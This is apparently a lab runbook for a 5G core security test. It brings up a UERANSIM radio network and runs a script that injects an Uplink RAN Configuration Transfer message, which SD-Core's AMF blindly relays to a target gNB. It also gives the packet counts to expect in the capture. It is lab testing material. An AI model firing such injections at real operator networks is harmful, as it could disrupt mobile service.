# SD-Core — Uplink RAN Config Transfer → SON/Xn blind relay (T08)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
Non-destructive. kind: `--network kind`; AMF captured on node netns `sdcore-control-plane`.
Target = the legit UERANSIM gNB, gNB-id **1**.

**1. RAN**
```bash
../5g-lab/scripts/ran.sh up ueransim sdcore
```
**2. Capture + fire**
```bash
export AMF_FILTER='sctp or (udp port 8805) or (udp port 2152) or (tcp portrange 8000-9100) or (tcp port 29518)'
CFG_CORE=sdcore ./capture_attack.sh sdcore_T08_son_inject \
    sdcore-control-plane - ueransim-sdcore-ueransim-gnb-1 kind 25 \
    -- ul-ran-config-transfer --target-gnb-id 0x1
```
**Expect:** NGAP **21 + 48 + 6** in `amf_ngap_nas_sbi.pcap` (NG Setup + UL RAN Config Transfer +
the AMF's Downlink relay to the target gNB `172.20.0.3`).
**Restore:** none (non-destructive).
